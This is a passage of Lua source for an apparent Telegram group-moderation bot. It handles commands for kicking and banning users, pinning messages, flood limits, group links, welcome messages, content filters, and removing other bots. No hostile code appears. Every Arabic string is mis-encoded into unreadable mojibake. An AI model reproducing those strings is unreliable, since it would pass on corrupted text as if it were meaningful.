send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"πβΏΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
Kick_Group(msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ Ψ·Ψ±Ψ―Ω ΩΩ ΩΩΨ§")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end  

if text and text:match("^Ψ·Ψ±Ψ― (%d+)$") and Addictive(msg) then 
local userid = text:match("^Ψ·Ψ±Ψ― (%d+)$") 
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'πβΏΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
if Rank_Checking(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(userid,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"πβΏΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
Kick_Group(msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ Ψ·Ψ±Ψ―Ω ΩΩ ΩΩΨ§")  
end,nil)   
end
return false
end

if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ―" or text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±" then
if Constructor(msg) then
database:set(bot_id.."Ban:Cheking"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, 'πβΏΨͺΩ ΨͺΨΉΨ·ΩΩ Β» Ψ§ΩΨ­ΨΈΨ± ~ ΩΨ§ΩΨ·Ψ±Ψ― ')
return false
end
end


if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ·Ψ±Ψ―" or text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ±" then
if Constructor(msg) then
database:del(bot_id.."Ban:Cheking"..msg.chat_id_)
send(msg.chat_id_, msg.id_, 'ββΏΨͺΩ ΨͺΩΨΉΩΩ Β» Ψ§ΩΨ­ΨΈΨ± ~ ΩΨ§ΩΨ·Ψ±Ψ― ')
return false
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ" or text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±ΩΩΩ" then
if Constructor(msg) then
database:set(bot_id.."Add:Group:Cheking"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, 'πβΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ±ΩΨΉ Β» Ψ§ΩΨ§Ψ―ΩΩ ~ Ψ§ΩΩΩΩΨ² ')
return false
end
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ" or text == "ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±ΩΩΩ" then
if Constructor(msg) then
database:del(bot_id.."Add:Group:Cheking"..msg.chat_id_)
send(msg.chat_id_, msg.id_, 'ββΏΨͺΩ ΨͺΩΨΉΩΩ Ψ±ΩΨΉ Β» Ψ§ΩΨ§Ψ―ΩΩ ~ Ψ§ΩΩΩΩΨ² ')
return false
end
end
if text ==("ΨͺΨ«Ψ¨ΩΨͺ") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then  
if database:sismember(bot_id.."Tshake:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"πβΏΨ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"π¨βΏΨͺΩ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§ΩΩ")   
database:set(bot_id.."Tshake:Pin:Id:Msg"..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"πβΏΨ§ΩΨ§ ΩΨ³Ψͺ Ψ§Ψ―ΩΩ ΩΩΨ§ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ Ψ«Ω Ψ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"β«οΈβΏΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ±Ψ¬Ω Ψ§ΩΨ§ΩΨ§Ψ?ΨͺΨ¨Ψ§Ψ± ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ")  
end
end,nil) 
end
if text == "Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and Addictive(msg) then  
if database:sismember(bot_id.."Tshake:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"πβΏΨ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"π βΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§ΩΩ")   
database:del(bot_id.."Tshake:Pin:Id:Msg"..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"πβΏΨ§ΩΨ§ ΩΨ³Ψͺ Ψ§Ψ―ΩΩ ΩΩΨ§ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ Ψ«Ω Ψ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"β«οΈβΏΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ±Ψ¬Ω Ψ§ΩΨ§ΩΨ§Ψ?ΨͺΨ¨Ψ§Ψ± ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ")  
end
end,nil)
end

if text and text:match("^ΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± (%d+)$") and Addictive(msg) then   
local Num = text:match("ΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± (.*)")
database:hset(bot_id.."Tshake:flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,"π¨βΏΨͺΩ ΩΨΆΨΉ ΨΉΨ―Ψ― Ψ§ΩΨͺΩΨ±Ψ§Ψ± ("..Num..")")  
end 
if text and text:match("^ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± (%d+)$") and Addictive(msg) then   
local Num = text:match("^ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± (%d+)$")
database:hset(bot_id.."Tshake:flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,"??βΏΨͺΩ ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± ("..Num..")") 
end
if text == "ΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·" or text == "ΩΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·" then
if msg.reply_to_message_id_ == 0  and Addictive(msg) then  
send(msg.chat_id_,msg.id_,"π βΏΨ§Ψ±Ψ³Ω Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ§Ω Ψ±Ψ§Ψ¨Ψ· ΩΩΨ§Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ")
database:setex(bot_id.."Tshake:Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·" or text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·' then
if Addictive(msg) then  
database:set(bot_id.."Tshake:Link_Group"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ· Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false  
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·" or text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·' then
if Addictive(msg) then  
database:del(bot_id.."Tshake:Link_Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"π«βΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false end
end
if text == "Ψ§ΩΨ±Ψ§Ψ¨Ψ·" then 
local status_Link = database:get(bot_id.."Tshake:Link_Group"..msg.chat_id_)
if not status_Link then
send(msg.chat_id_, msg.id_,"π΄βΏΨ§ΩΨ±Ψ§Ψ¨Ψ· ΩΨΉΨ·Ω") 
return false  
end
local link = database:get(bot_id.."Tshake:Private:Group:Link"..msg.chat_id_)            
if link then                              
send(msg.chat_id_,msg.id_,"βοΈβΏΨ±Ψ§Ψ¨Ψ· Ψ§ΩΩΨ¬ΩΩΨΉΨ© β±\n ["..link.."]")                          
else                
send(msg.chat_id_, msg.id_,"β«οΈβΏΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ§Ψ¨Ψ· Ψ§Ψ±Ψ³Ω ΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·")              
end            
end
if text == "ΩΨ³Ψ­ Ψ§ΩΨ±Ψ§Ψ¨Ψ·" or text == "Ψ­Ψ°Ω Ψ§ΩΨ±Ψ§Ψ¨Ψ·" then
if Addictive(msg) then     
send(msg.chat_id_,msg.id_,"ββΏΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ§Ψ¨Ψ· ")           
database:del(bot_id.."Tshake:Private:Group:Link"..msg.chat_id_) 
return false      
end
return false  
end
if text and text:match("^ΨΆΨΉ Ψ΅ΩΨ±Ω") and Addictive(msg) and msg.reply_to_message_id_ == 0 or text and text:match("^ΩΨΆΨΉ Ψ΅ΩΨ±Ω") and Addictive(msg) and msg.reply_to_message_id_ == 0 then  
database:set(bot_id.."Tshake:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,"πβΏΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ΅ΩΨ±Ω") 
return false
end
if text == "Ψ­Ψ°Ω Ψ§ΩΨ΅ΩΨ±Ω" or text == "ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ±Ω" then 
if Addictive(msg) then
https.request("https://api.telegram.org/bot"..token.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ΅ΩΨ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
return false  
end
if text == "ΨΆΨΉ ΩΨ΅Ω" or text == "ΩΨΆΨΉ ΩΨ΅Ω" then  
if Addictive(msg) then
database:setex(bot_id.."Tshake:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,"π βΏΨ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ§ΩΩΨ΅Ω")
end
return false  
end
if text == "ΨΆΨΉ ΨͺΨ±Ψ­ΩΨ¨" or text == "ΩΨΆΨΉ ΨͺΨ±Ψ­ΩΨ¨" then  
if Addictive(msg) then
database:setex(bot_id.."Tshake:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = "π¨βΏΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΨ§Ω"
tt = "\nβ«οΈβΏΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΨΆΨ§ΩΨ© ΩΨ§ΩΩΩ !\nπ€βΏΨ―Ψ§ΩΨ© ΨΉΨ±ΨΆ Ψ§ΩΨ§Ψ³Ω Β»{`name`}\nπβΏΨ―Ψ§ΩΨ© ΨΉΨ±ΨΆ Ψ§ΩΩΨΉΨ±Ω Β»{`user`}"
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == "Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" and Addictive(msg) then 
if database:get(bot_id.."Tshake:Get:Welcome:Group"..msg.chat_id_)   then 
Welcome = database:get(bot_id.."Tshake:Get:Welcome:Group"..msg.chat_id_)  
else 
Welcome = "ββΏΩΩ ΩΨͺΩ ΨͺΨΉΩΩΩ ΨͺΨ±Ψ­ΩΨ¨ ΩΩΩΨ¬ΩΩΨΉΩ"
end 
send(msg.chat_id_, msg.id_,"["..Welcome.."]") 
return false  
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" and Addictive(msg) then  
database:set(bot_id.."Tshake:Chek:Welcome"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ ΨͺΩΨΉΩΩ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false  
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" and Addictive(msg) then  
database:del(bot_id.."Tshake:Chek:Welcome"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ ΨͺΨΉΨ·ΩΩ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false  
end
if text == "ΩΨ³Ψ­ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" or text == "Ψ­Ψ°Ω Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" then 
if Addictive(msg) then
database:del(bot_id.."Tshake:Get:Welcome:Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
return false  
end
if text == 'ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ' and Owner(msg) then     
database:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'πβΏ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ')  
end
if text == 'ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±' and Owner(msg) then     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'πβΏ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±')  
end
if text == 'ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ' and Owner(msg) then     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'πβΏ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ')  
end
if text == 'ΩΩΨΉ' and tonumber(msg.reply_to_message_id_) > 0 and Owner(msg) then     
function cb(a,b,c) 
textt = 'πβΏΨͺΩ ΩΩΨΉ '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'Ψ§ΩΩΩΨ΅Ω'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ ΩΨ¬Ψ―Ψ―Ψ§')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'Ψ§ΩΨ΅ΩΨ±Ω'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ ΩΨ¬Ψ―Ψ―Ψ§')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'Ψ§ΩΩΨͺΨ­Ψ±ΩΩ'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ ΩΨ¬Ψ―Ψ―Ψ§')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ' and tonumber(msg.reply_to_message_id_) > 0 and Owner(msg) then     
function cb(a,b,c) 
textt = 'πβΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'Ψ§ΩΩΩΨ΅Ω'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩΩΩΩΩ Ψ§ΩΨ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ§Ω')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'Ψ§ΩΨ΅ΩΨ±Ω'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩΩΩΩΩ Ψ§ΩΨ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ§Ω')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'Ψ§ΩΩΨͺΨ­Ψ±ΩΩ'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩΩΩΩΩ Ψ§ΩΨ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ§Ω')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == "ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ" and Addictive(msg) then   
local list = database:smembers(bot_id.."Tshake:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Tshake:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Tshake:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ")  
end

if text == "ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ" and Addictive(msg) then   
local list = database:smembers(bot_id.."Tshake:List:Filter"..msg.chat_id_)  
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨΉ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do  
local Tshake_Msg = database:get(bot_id.."Tshake:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." Β» {"..Tshake_Msg.."}\n"    
end  
if #list == 0 then  
t = "πβΏΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ§Ψͺ ΩΩΩΩΨΉΩ"  
end  
send(msg.chat_id_, msg.id_,t)  
end  
if text and text == "ΩΩΨΉ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then       
send(msg.chat_id_, msg.id_,"π?βΏΨ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ ΩΩΩΨΉΩΨ§")  
database:set(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§Ψ±Ψ³Ω Ψ§ΩΨͺΨ­Ψ°ΩΨ± ΨΉΩΨ― Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΩΩΩ")  
database:set(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Tshake:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Tshake:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"π¨βΏΨͺΩ ΩΩΨΉ Ψ§ΩΩΩΩΩ ΩΨΉ Ψ§ΩΨͺΨ­Ψ°ΩΨ±")  
database:del(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Tshake:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Tshake:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Tshake:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then    
send(msg.chat_id_, msg.id_,"π¨βΏΨ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨ§Ω")  
database:set(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_,"π βΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉΩΨ§ ")  
database:del(bot_id.."Tshake:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Tshake:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Tshake:List:Filter"..msg.chat_id_,text)  
return false  end  
end

if text == "Ψ·Ψ±Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" and Addictive(msg) then 
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
Kick_Group(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΨͺΩΨ¬Ψ― Ψ¨ΩΨͺΨ§Ψͺ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")
else
local t = "π βΏΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ ΩΩΨ§ >> {"..c.."}\nπβΏΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§Ψ―ΩΩ >> {"..x.."}\nπ¨βΏΨͺΩ Ψ·Ψ±Ψ― >> {"..(c - x).."} ΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ"
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
if text == ("ΩΨ΄Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ") and Addictive(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΩΩΨ¬ΩΨ―Ω \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ""
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = "Β {β―}"
end
text = text..">>Β [@"..ta.username_.."]"..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΨͺΩΨ¬Ψ― Ψ¨ΩΨͺΨ§Ψͺ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")
return false 
end
if #admins == i then 
local a = "\nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \nπ βΏΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩΨ§ >> {"..n.."} Ψ¨ΩΨͺ\n"
